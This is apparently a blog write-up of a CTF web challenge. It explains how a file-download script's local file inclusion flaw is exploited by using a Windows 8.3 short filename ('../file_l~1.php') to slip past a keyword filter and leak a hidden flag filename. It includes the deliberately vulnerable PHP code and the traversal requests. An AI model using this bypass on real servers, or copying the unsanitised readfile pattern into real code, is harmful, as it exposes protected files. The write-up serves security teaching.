---
author: AnirudhAnand
layout: post
title: Abusing file inclusions using Windows 8.3 filename legacy shortcodes - MMACTF Rotten Uploader web 150 writeup
categories:
- ctf
summary: Using the legacy windows 8.3 filename short code, we bypass the filter to download files. (MMACTF 2016 web 150 writeup)
description: Using the legacy windows 8.3 filename short code, we bypass the filter to download files. (MMACTF 2016 web 150 writeup)
---

## Introduction

Rotten Uploader was a good challenge but it took a good amount of time to solve it despite being as easy challenge (ofcourse its easy once you know how to do it :P). So here is the challenge description:

```
Find the secret file.

http://rup.chal.ctf.westerns.tokyo/

Hint1 (2016/09/04 16:31)

The files/directories on the DOCUMENT_ROOT are below four.
download.php
file_list.php
index.php
uploads(directory)
The number of files in the DOCUMENT_ROOT/uploads is 5. The directory have "index.html".
You don't need scan tools.
```

## Challenge

We are presented with a site which can be used to download 3 files namely `test.cpp`, `test.rb` and `test.c`. The download happens through a file named `download.php`:

[http://rup.chal.ctf.westerns.tokyo/download.php?f=test.cpp](http://rup.chal.ctf.westerns.tokyo/download.php?f=test.cpp)

The first thing that comes to our mind after seeing the URL is to test for Local File Inclusion (LFI) and indeed it was vulnerable to LFI ! So lets download the source code of `download.php`.

File: `download.php`

{%highlight php lineos %}

<?php

header("Content-Type: application/octet-stream");

if(stripos($_GET['f'], 'file_list') !== FALSE) die();
readfile('uploads/' . $_GET['f']); // safe_dir is enabled.

?>

{%endhighlight%}

and index.php.

File: `index.php`

{%highlight php lineos %}

<?php
/**
 *
 */
include('file_list.php');
?>
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0 Level 2//EN">
<html>
  <head>
    <title>Uploader</title>
  </head>
  <body>
    <h1>Simple Uploader</h1>
    <p>There are no upload features.</p>
    <h3>Files</h3>
    <table width="100%" border="1">
		  <tr>
			<th>#</th>
			<th>Filename</th>
			<th>Size</th>
			<th>Link</th>
		  </tr>
			  <?php foreach($files as $file): ?>
	<?php if($file[0]) continue; // visible flag ?>  
		  <tr>
			<td><?= $file[1]; ?></td>
			<td><?= $file[2]; ?></td>
			<td><?= $file[3]; ?> bytes</td>
			<td><a href="download.php?f=<?= $file[4]; ?>">Download</a></td>
		  </tr>
          <?php endforeach;?>
      </table>
  </body>
</html>

{%endhighlight%}

Till now we understood the following points:

1) The `uploads/` directory has 5 files in which 4 are known to us. So the 5th file (whose name we don't know yet) has to be the flag.

2) If we know the filename, we can download it via `download.php`. The only possible way to know the filename is to get the `file_list.php` which will contain the list of all files.

3) The string `file_list` has been blocked by an `stripos()` function check which is cannot be bypassed easily (as `stripos()` don't have any known bypasses).


## Solution:

It took a while to understand that the server is running windows. So the question arises, why do they configure the challenge on a windows machine while all others are on linux (Linux is usually prefered for web servers)? Then we came across a legacy windows feature called [`Windows 8.3 filename`](https://en.wikipedia.org/wiki/8.3_filename) and that lead us to the bypass !

So computing the filename, we can use `file_l~1.php` so the file can be download by sending the following request:`download.php?f=../file_l~1.php` and this got us the source code of `file_list.php`

File: `file_list.php`

{%highlight php lineos %}

<?php
$files = [
  [FALSE, 1, 'test.cpp', 1135, 'test.cpp'],
  [FALSE, 2, 'test.c', 74, 'test.c'],
  [TRUE, 3, 'flag_c82e41f5bb7c8d4b947c9586444578ade88fe0d7', 35, 'flag_c82e41f5bb7c8d4b947c9586444578ade88fe0d7'],
  [FALSE, 4, 'test.rb', 1446, 'test.rb'],
];

{%endhighlight%}

So now we know the filename in which flag is present and hence we can download it using the LFI: `download.php?f=flag_c82e41f5bb7c8d4b947c9586444578ade88fe0d7`

## References

1) [Windows 8.3 filename](https://en.wikipedia.org/wiki/8.3_filename)
